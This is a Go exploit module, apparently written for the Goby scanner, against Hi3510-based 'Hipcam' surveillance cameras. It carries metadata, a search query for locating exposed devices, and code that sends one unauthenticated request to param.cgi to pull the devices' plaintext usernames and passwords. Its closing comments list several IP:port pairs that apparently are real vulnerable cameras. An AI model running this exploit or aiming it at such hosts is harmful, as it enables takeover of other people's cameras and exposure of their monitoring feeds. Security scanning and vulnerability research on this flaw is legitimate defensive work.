package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hipcam User Credential Disclosure",
    "Description": "The plaintext password of the surveillance camera based on Huawei Hi3510 chip is leaked, and the attacker can view all the user names and passwords of the device, obtain the background permissions, view the monitoring content and control the whole device only through a simple HTTP request.",
    "Product": "Hipcam",
    "Homepage": "https://www.huawei.com",
    "DisclosureDate": "2021-06-04",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "body=\"Error: username or password error,please input again.\"",
    "Level": "3",
    "Impact": "<p>With a simple HTTP request, an attacker can view all the user names and passwords of the device, obtain background permissions, view the monitoring content, and control the entire device.</p>",
    "Recommendation": "<p>1. Increase permission settings</p><p>2. The whitelist restricts the login ip</p><p>3. Internet access is prohibited</p>",
    "References": [
        "https://www.secpulse.com/archives/45468.html"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10220"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "username0=") && strings.Contains(resp.Utf8Html, "password0=")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//cmd := ss.Params["cmd"].(string)
			cfg := httpclient.NewGetRequestConfig("/web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "username0=") && strings.Contains(resp.Utf8Html, "password0=") {
					expResult.Success = true
					expResult.Output = resp.RawBody
				}

			}
			return expResult
		},
	))
}

// 219.73.73.10:49151
// 73.127.16.157:81
// 73.23.58.29:81
// 88.106.65.251:1024
// 101.127.33.1:8081
// 138.19.54.106:81
// 176.233.8.11:82
